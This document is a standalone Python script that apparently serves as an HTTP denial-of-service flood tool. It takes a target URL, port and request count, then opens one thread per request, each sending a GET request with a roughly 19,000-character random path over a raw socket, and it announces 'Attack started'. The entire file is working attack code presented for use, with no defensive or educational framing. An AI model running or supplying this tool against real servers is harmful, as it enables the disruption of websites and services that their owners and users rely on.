import random
import socket
import string
import sys
import threading
import time
from urllib.parse import urlparse

# parse inputs
target_url = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 3:
    target_url = sys.argv[1]
    port = 80
    num_requests = int(sys.argv[2])
elif len(sys.argv) == 4:
    target_url = sys.argv[1]
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print(f"ERROR: Invalid number of arguments\nUsage: {sys.argv[0]} <URL> <Port> <Number_of_Attacks>")
    sys.exit(1)

# extract host and port from the URL
parsed_url = urlparse(target_url)
host = parsed_url.netloc
if ":" in host:
    host, port = host.split(":")
    port = int(port)

try:
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print(f"ERROR: Failed to resolve hostname: {host}")
    sys.exit(2)

# create a shared variable for thread counts
thread_num = 20
thread_num_mutex = threading.Lock()

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1

    sys.stdout.write(f"\r[{time.ctime().split()[3]}] [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

# set payload size
def generate_large_payload(size=19000):
    msg = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(size))
    return msg

def attack():
    print_status()
    url_path = generate_large_payload()

    # create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, port))

        # send the HTTP request according to spec
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error as e:
        print(f"\nERROR: {str(e)}")
    finally:
        # close the socket to release the file descriptor (!!!)
        dos.close()

print(f"[#] Attack started on {host} ({ip}) || Port: {str(port)} || # Requests: {str(num_requests)}")

# spawn a thread per request
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()
